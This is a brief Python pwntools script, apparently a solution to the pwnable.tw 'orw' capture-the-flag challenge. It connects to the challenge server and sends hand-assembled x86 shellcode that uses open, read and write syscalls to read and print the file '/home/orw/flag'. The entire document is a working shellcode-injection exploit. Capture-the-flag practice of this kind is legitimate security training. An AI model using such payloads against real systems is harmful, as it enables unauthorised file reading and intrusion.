from pwn import *
c=remote('chall.pwnable.tw',10001)
shellcode=asm("push 0;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;mov edx,0x0;mov ecx,0x0;int 0x80;mov ecx,ebx;mov ebx,eax;mov eax,0x3;mov edx,50;int 0x80;mov eax,0x4;mov ebx,0x1;mov edx,50;int 0x80;")
c.recvuntil(":")
c.sendline(shellcode)
c.recvline()
c.interactive()
print shellcode
